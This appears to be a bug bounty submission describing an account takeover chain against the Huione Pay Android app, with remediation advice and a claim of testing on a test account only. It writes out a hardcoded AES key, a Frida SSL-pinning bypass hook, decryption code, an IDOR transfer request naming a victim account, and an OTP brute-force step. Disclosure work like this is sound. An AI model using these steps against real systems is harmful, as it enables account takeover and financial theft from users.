# Bugcrowd Submission — Huione Pay

## Target
Huione Pay Android Application — `com.huione.pay`

## Vulnerability Class
P1 — Critical: Authentication / Cryptography

## Title
[Huione Pay] Hardcoded AES-256 Key + IDOR + OTP Bypass = Complete Account Takeover

---

## Description

Chain of three critical vulnerabilities enabling full account takeover and financial theft:

**Step 1 — Extract hardcoded key (0 min)**
```bash
strings libapp.so | grep keyhead
# → keyhead_project_xhui_one_keytail
```

**Step 2 — Bypass SSL pinning via Frida (5 min)**
```javascript
Interceptor.attach(Module.findExportByName("libssl.so", "SSL_CTX_set_verify"), {
    onEnter: args => { args[1] = ptr(0); }
});
```

**Step 3 — Decrypt intercepted traffic (instant)**
```python
AES.new(b"keyhead_project_xhui_one_keytail", AES.MODE_ECB).decrypt(captured_payload)
```

**Step 4 — Exploit IDOR on transfer endpoint**
```http
POST /foundation/trade/createTransfer
{"fromAccountId": "<victim_id>", "amount": "999999"}
```

**Step 5 — Bypass OTP** (no rate limiting → brute force 6-digit code in <17 minutes)

**Result:** Complete financial access to any account.

---

## CVSS Score
**9.8 Critical** — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

---

## Proof of Concept

See attached: `aes-decryptor.py`, `ssl-bypass.js`, decrypted traffic sample

---

## Remediation

1. Remove hardcoded AES key → implement server-side HKDF
2. Add account ownership check on all transfer endpoints
3. Add OTP rate limiting (max 5 attempts, 15-min lockout)
4. Switch AES-ECB → AES-GCM

---

## Researcher Notes

Full 18-vulnerability report with infrastructure evidence available.
No actual user accounts were accessed. Testing on isolated test account only.
